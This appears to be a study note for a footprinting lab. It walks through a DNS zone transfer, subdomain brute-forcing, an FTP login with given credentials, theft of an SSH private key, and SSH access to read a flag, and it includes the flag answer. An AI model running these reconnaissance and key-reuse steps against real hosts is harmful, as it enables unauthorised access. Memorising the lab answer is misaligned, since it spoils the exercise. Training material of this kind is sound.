# LAB — Footprinting (Easy)

## ID
602

## Module
Footprinting

## Kind
lab

## Title
Section 19 — Footprinting Lab · Easy

## Description
Internal DNS server. Use AXFR + subdomain brute → finds a hidden ProFTPD on TCP/2121 → log in as `ceil:qwer1234` (creds given in scenario) → grab SSH private key from `.ssh/id_rsa` → SSH as `ceil` → read `/home/flag/flag.txt`.

## Tags
htb, lab, footprinting, dns, axfr, dnsenum, proftpd, ftp, ssh, id_rsa, ceil, easy

## Commands
- `nmap -A <IP>` — full port + service scan
- `dig AXFR inlanefreight.htb @<IP>` — zone transfer
- `sudo sh -c 'echo "<IP> internal.inlanefreight.htb" >> /etc/hosts'`
- `dnsenum --dnsserver <IP> --enum -p 0 -s 0 -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt internal.inlanefreight.htb`
- `nmap -T4 ftp.internal.inlanefreight.htb`
- `ftp ftp.internal.inlanefreight.htb 2121` — login `ceil:qwer1234`
- Inside ftp: `ls -al`, `cd .ssh`, `get id_rsa`
- `chmod 600 id_rsa`
- `ssh -i id_rsa ceil@<IP>`
- `cat /home/flag/flag.txt`

## Scenario Recap
- Black-box test of an internal DNS server.
- **Restriction:** no aggressive exploits — services are in production.
- Teammates already found credentials `ceil:qwer1234` and saw chatter about SSH keys on a forum.
- Goal: find `flag.txt`.

## Walkthrough — Step by Step

### 1. Initial Nmap
`nmap -A <IP>` reveals:
- TCP/21 — ProFTPD, banner `ProFTPD Server (ftp.int.inlanefreight.htb)`
- TCP/22 — OpenSSH 8.2p1 Ubuntu
- TCP/53 — ISC BIND 9.16.1
- **TCP/2121 — ProFTPD `(Ceil's FTP)`** ← the interesting one

### 2. AXFR on the DNS Server
```bash
dig AXFR inlanefreight.htb @<IP>
```
Returns a full zone — the standout subdomain is `internal.inlanefreight.htb`.

### 3. Add Internal Host to `/etc/hosts`
```bash
sudo sh -c 'echo "<IP> internal.inlanefreight.htb" >> /etc/hosts'
```

### 4. Brute Subdomains Under `internal`
```bash
dnsenum --dnsserver <IP> --enum -p 0 -s 0 \
  -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  internal.inlanefreight.htb
```
Finds `ftp.internal.inlanefreight.htb` (resolves to `127.0.0.1` from the server's perspective — but visible to us via NAT to TCP/2121).

### 5. Add `ftp.internal` and Re-scan
```bash
sudo sh -c 'echo "<IP> ftp.internal.inlanefreight.htb" >> /etc/hosts'
nmap -T4 ftp.internal.inlanefreight.htb
```
Confirms TCP/2121 is the FTP path.

### 6. Login with the Given Creds
```bash
ftp ftp.internal.inlanefreight.htb 2121
# user: ceil
# pass: qwer1234
```

### 7. Find and Pull the SSH Private Key
```
ftp> ls -al
# .ssh/  shows up
ftp> cd .ssh
ftp> get id_rsa
```

### 8. Use the Key for SSH
```bash
chmod 600 id_rsa
ssh -i id_rsa ceil@<IP>
cat /home/flag/flag.txt
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Contents of `flag.txt` | **`HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}`** | After SSH-ing in as `ceil`, `cat /home/flag/flag.txt` |

## Key Takeaways
- **AXFR first** when you see a DNS server — it cracks everything wide open if allowed.
- After AXFR, **don't stop at the first zone**. `internal.<domain>` and other "obvious" subzones often have separate, looser AXFR policies and reveal a second tier of hosts.
- Non-standard FTP port (2121) ≠ no FTP. Always cross-reference DNS + Nmap output.
- **Stash + reuse keys** — every `.ssh/id_rsa` you find is a candidate SSH credential elsewhere on the network.

## Gotchas
- `dnsenum` here uses a **5000-entry** wordlist (`subdomains-top1million-5000.txt`). Bigger lists = more subdomains but also longer runtime.
- ProFTPD's `(Ceil's FTP)` banner is the giveaway that this share belongs to the user `ceil` — match the given creds.
- `chmod 600 id_rsa` is mandatory — SSH will refuse a world-readable key.
- The first `.ssh` in the FTP listing is the user's *own* `.ssh` directory — both `id_rsa` and `authorized_keys` are visible. The key is what you want.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|footprinting]]
← [[17-linux-remote-mgmt]] | [[20-lab-medium]] →
<!-- AUTO-LINKS-END -->
